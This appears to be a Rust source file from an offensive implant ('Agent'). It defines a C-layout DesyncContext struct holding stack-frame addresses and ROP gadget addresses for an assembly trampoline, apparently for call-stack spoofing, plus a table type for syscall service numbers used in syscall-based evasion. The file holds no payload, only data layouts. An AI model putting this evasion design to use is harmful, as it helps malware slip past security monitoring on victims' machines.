// __NAME__ Agent — DESYNC Context Structures
//
// #[repr(C)] structs matching the C++ layout byte-for-byte.
// ASM trampoline reads DesyncContext at well-known offsets.

#![allow(dead_code)]

// ─── DesyncContext ────────────────────────────────────────────────────────
// 72 bytes. Exactly matches C++ layout and ASM field offsets.
//
// offset  field
//  +0     first_frame_addr     (SET_FPREG function)
//  +8     first_frame_size
// +16     second_frame_addr    (PUSH_NONVOL RBP function)
// +24     second_frame_size
// +32     jmp_rbx_gadget       (FF 23, CALL-preceded for Eclipse)
// +40     add_rsp_x_gadget     (48 83/81 C4 XX ... C3)
// +48     add_rsp_x_value      (displacement X)
// +56     jmp_rbx_frame_size
// +64     rbp_plant_offset     (offset into F2 to plant RBP)

#[repr(C)]
#[derive(Clone, Copy, Default)]
pub struct DesyncContext {
    pub first_frame_addr:    usize,  // +0
    pub first_frame_size:    usize,  // +8
    pub second_frame_addr:   usize,  // +16
    pub second_frame_size:   usize,  // +24
    pub jmp_rbx_gadget:      usize,  // +32
    pub add_rsp_x_gadget:    usize,  // +40
    pub add_rsp_x_value:     usize,  // +48
    pub jmp_rbx_frame_size:  usize,  // +56
    pub rbp_plant_offset:    usize,  // +64
}

const _: () = assert!(core::mem::size_of::<DesyncContext>() == 72);

// Field offset verification (checked at compile time via size math)
const _: () = assert!(core::mem::size_of::<usize>() == 8); // x64 only
// 9 fields * 8 bytes = 72 — sequential usize fields guarantee correct offsets

// ─── SSN table entry ──────────────────────────────────────────────────────

#[derive(Clone, Copy, Default)]
pub struct SsnEntry {
    pub name_hash: u32,
    pub ssn:       u16,
    pub address:   usize,
}

pub const MAX_SSN_ENTRIES: usize = 512;
